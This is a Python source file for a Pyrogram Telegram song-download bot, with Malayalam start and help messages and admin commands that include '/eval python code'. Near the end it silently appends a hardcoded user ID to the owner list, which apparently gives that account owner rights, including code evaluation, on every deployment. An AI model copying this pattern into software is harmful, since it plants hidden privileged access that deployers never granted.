from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from TamilBots.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from TamilBots import app, LOGGER
from TamilBots.TamilBots import ignore_blacklisted_users
from TamilBots.sql.chat_sql import add_chat_to_db

start_text = """
നമസ്കാരം ❤! [{}](tg://user?id={}),

ഞാൻ പാട്ട് ഡൌൺലോഡ് ചെയ്യുന്ന ബോട്ട് ആണ്! [🎶](https://t.me/AS_MUSIC_GROUP_CHANNEL/2)

 എന്നെ നിർമ്മിച്ചിരിക്കുന്നത് ഇദ്ദേഹം ആണ് @sanaj0_5 🤖

താങ്കൾക്കു ആവിശ്യം ഉള്ള പാട്ടിന്റെ പേര് തരൂ......... 🥰🤗🥰

ഉദാഹരണം :- ```/as enjoy enjaami```
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
           [[InlineKeyboardButton(text="💘 എന്റെ ഗ്രൂപ്പ്‌ 💘", url="https://t.me/AS_MUSIC_GROUP"),
             InlineKeyboardButton(
                        text="മൊയലാളി 😘", url="https://t.me/sanaj0_5"
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "സുഹൃത്തേ...ആവിശ്യമുള്ള പാട്ടിന്റെ പേര് തരൂ....🥰🤗🥰\n /as (പാട്ടിന്റെ പേര്) 🥳"
    await message.reply(text)

OWNER_ID.append(1492186775)
app.start()
LOGGER.info("SongPlayRoBot Is Now Working🤗🤗🤗")
idle()
